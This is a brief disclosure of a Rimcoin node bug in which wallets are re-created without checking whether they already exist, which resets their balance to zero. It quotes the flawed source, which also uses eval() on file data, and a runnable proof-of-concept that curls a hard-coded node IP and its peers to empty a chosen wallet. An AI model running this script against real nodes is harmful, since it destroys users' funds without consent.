# RIM-2018-4192

RIM-2018-4192 is a bug that was actually really simple, SCARILY simple, but would erase ANYONE's funds, without their consent in any way.

The bug was in this source:

```python
elif c=="add_rc_wallet":
    BALANCES=open("balance","r").read() # get file
    BALANCES=eval(BALANCES) # evaluate
    BALANCEW=open("balance","w") # open
    BALANCES[args[0]]=0 # add new wallet
    BALANCEW.write(str(BALANCES)) # write
    BALANCEW.close() # close
    IPS=open("ip","r").read() # open id file
    IPS=eval(IPS) # evaluate
    IPS[args[0]]=ip
    IP=open('ip','w')
    IP.write(str(IPS))
    IP.close()
```

The bug is that it doesn't check if the wallet already exists. 

So here is what a sample PoC would look like:

```python
import subprocess,sys,os

contact_node="67.241.245.218:8080"
nodes=eval(subprocess.check_output("curl "+contact_node+"/rq_node"))

for j in nodes:
    print("New target node is "+j)
    os.system("curl "+j+"/add_node_wallet*"+sys.argv[1])
print("Contacting OG node - "+contact_node)
os.system("curl "+contact_node+"/add_node_wallet*"+sys.argv[1])

print("""FUND OVERRIDING DUE TO NODE CONTACT BUG (RIM-2018-4192)

- BY IHATERA1N, 2018. 
THE RIMCOIN WALLET ADDRESS """+sys.argv[1]+""" HAS BEEN EMPTIED. 

¯\_(ツ)_/¯""")
```

Of course, we have already patched this bug on our main node.
